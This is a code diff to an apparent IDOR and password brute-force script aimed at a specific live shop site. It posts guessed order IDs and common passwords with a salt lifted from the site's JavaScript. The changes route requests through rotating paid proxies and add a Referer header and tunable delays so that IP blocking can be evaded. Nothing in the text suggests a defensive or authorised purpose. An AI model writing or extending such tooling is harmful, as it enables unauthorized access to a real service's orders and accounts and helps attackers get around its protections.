@@ -10,11 +10,18 @@ Usage (when IP not blocked):
   python3 xinhe_idor.py --id 1 --wordlist passwords.txt
   python3 xinhe_idor.py --range 1 5000 --passwords 123456,test,password,888888
 """
-import argparse, hashlib, json, time, subprocess, sys
+import argparse, hashlib, json, time, subprocess, sys, os
+
+try:
+    from qingguo_proxy import get_proxy, egress_ip
+    HAS_QG = True
+except ImportError:
+    HAS_QG = False
 
 BASE = "https://xinhe001.lol/shop/ajax.php?act=order"
 UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0"
 DELAY = 8
+USE_PROXY = os.environ.get("QG_AUTHKEY") and os.environ.get("QG_AUTHPWD")
 
 HASHSALT = "8d6673bb4bde73830ed11c898186a872"  # decoded from faka.js
 
@@ -48,8 +55,15 @@ def post_order(oid, skey, timeout=20):
         "curl", "-sS", "-m", str(timeout), "-A", UA,
         "-X", "POST", "-H", "Content-Type: application/x-www-form-urlencoded",
         "-H", "Accept-Language: zh-CN,zh;q=0.9",
-        "-d", data, BASE,
+        "-H", "Referer: https://xinhe001.lol/shop/?mod=query",
     ]
+    if USE_PROXY and HAS_QG:
+        try:
+            px = get_proxy()
+            cmd += ["-x", px["proxy_url"]]
+        except Exception as e:
+            print(f"[!] proxy error: {e}", file=sys.stderr)
+    cmd += ["-d", data, BASE]
     try:
         return subprocess.check_output(cmd, stderr=subprocess.STDOUT).decode("utf-8", "replace")
     except subprocess.CalledProcessError as e:
@@ -83,7 +97,15 @@ def main():
     ap.add_argument("--passwords", default="", help="comma-separated extra passwords")
     ap.add_argument("--wordlist", help="password file")
     ap.add_argument("-o", "--output", default="xinhe_idor_hits.json")
+    ap.add_argument("--delay", type=float, default=DELAY, help="seconds between requests")
     args = ap.parse_args()
+    global DELAY
+    DELAY = args.delay
+
+    if USE_PROXY:
+        print(f"[*] 青果代理已启用, egress={egress_ip() if HAS_QG else '?'}", flush=True)
+    elif HAS_QG:
+        print("[*] 未设置 QG_AUTHKEY/QG_AUTHPWD，直连模式", flush=True)
 
     extra = args.passwords.split(",") if args.passwords else None
     if args.wordlist:
